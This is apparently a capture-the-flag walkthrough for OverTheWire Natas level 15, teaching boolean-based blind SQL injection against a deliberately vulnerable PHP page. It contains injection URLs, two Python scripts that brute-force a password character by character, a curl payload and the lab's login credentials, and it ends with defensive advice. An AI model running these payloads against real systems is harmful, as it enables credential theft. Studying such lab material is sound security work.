// Challenge Overview

This level builds on Level 14 but now the application does not display the query results. Instead, it only returns a success or failure message based on whether a user exists in the database. This is a Blind SQL Injection — we can't see the data directly, but we can infer it by asking true/false questions.

// Initial Analysis

View the source code to understand the behavior:

<?php if(array_key_exists("username", $_GET)) { $query = "SELECT * FROM users WHERE username='" . $_GET['username'] . "'"; $result = mysql_query($query); if(mysql_num_rows($result) > 0) { print "This user exists."; } else { print "This user doesn't exist."; } } ?>

The application only tells us whether a username exists or not. This is a classic example of Boolean-based Blind SQL Injection.

💡 In Blind SQL Injection, the application doesn't return data directly. Instead, we can ask the database yes/no questions and infer the answer based on the application's response.

// Understanding Blind SQL Injection

We can use SQL's CASE statement or conditional logic to ask questions about the data:

  • True condition: The user exists → "This user exists"
  • False condition: The user doesn't exist → "This user doesn't exist"

By crafting queries that evaluate to true only when a specific condition is met, we can extract information one bit at a time.

// Solution Walkthrough

Step 1 — Confirm the username exists:

http://natas15.natas.labs.overthewire.org/?username=natas16 # Response: "This user exists."

Step 2 — Query the password length:

http://natas15.natas.labs.overthewire.org/?username=natas16' AND LENGTH(password)=32 --

Step 3 — Extract characters one by one:

# Check if the first character is 'a' (ASCII 97) http://natas15.natas.labs.overthewire.org/?username=natas16' AND ASCII(SUBSTRING(password,1,1))=97 -- # Check if the first character is 'b' (ASCII 98) http://natas15.natas.labs.overthewire.org/?username=natas16' AND ASCII(SUBSTRING(password,1,1))=98 -- # Continue for each character

Step 4 — Automate with Python:

import requests import string url = "http://natas15.natas.labs.overthewire.org/" auth = ("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J") # Characters that can appear in the password charset = string.ascii_letters + string.digits # Query the username to confirm it exists params = {"username": "natas16"} response = requests.get(url, auth=auth, params=params) print(response.text) # Should show "This user exists." # Blind SQL injection to extract the password password = "" for position in range(1, 33): for char in charset: payload = f"natas16' AND SUBSTRING(password, {position}, 1) = '{char}' -- " params = {"username": payload} response = requests.get(url, auth=auth, params=params) if "This user exists" in response.text: password += char print(f"Position {position}: {char}") break print(f"Password: {password}")

Or using a more efficient approach with ASCII values:

import requests url = "http://natas15.natas.labs.overthewire.org/" auth = ("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J") password = "" for i in range(1, 33): for c in range(48, 123): # ASCII 48-122 (0-9, A-Z, a-z) payload = f"natas16' AND ASCII(SUBSTRING(password, {i}, 1)) = {c} -- " params = {"username": payload} response = requests.get(url, auth=auth, params=params) if "This user exists" in response.text: password += chr(c) print(f"Found: {password}") break print(f"Complete password: {password}")

Using curl with conditional queries:

# Check if the first character is 'W' curl -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J \ "http://natas15.natas.labs.overthewire.org/?username=natas16' AND SUBSTRING(password,1,1)='W' -- "

// Why It Works

The blind SQL injection works because:

  • Input is not sanitized: User input is concatenated into the query.
  • Different responses: The application gives different outputs based on the query result.
  • Conditional logic can be injected: We can add conditions that return true or false.
  • Information is leaked bit by bit: Each query reveals one bit of information.

// Types of Blind SQL Injection

Type Detection Method Extraction Method
Boolean-BasedTrue/False responsesConditional queries
Time-BasedResponse time differencesSLEEP() or BENCHMARK()
Error-BasedError messagesExtract from error responses

// Defensive Measures

  • Use prepared statements with parameterized queries.
  • Input validation: Validate and sanitize all user input.
  • Error handling: Provide generic error messages, don't reveal database details.
  • Rate limiting: Limit the number of queries per user to prevent automated extraction.
  • Use a web application firewall (WAF) to detect and block SQL injection attempts.

// Key Takeaways

🔍 Blind SQL Injection Is Stealthy

Even when applications don't display data, attackers can extract information one bit at a time using blind techniques.

🛡️ Prevention Is Essential

Use parameterized queries to completely prevent SQL injection. No other defense is as effective.
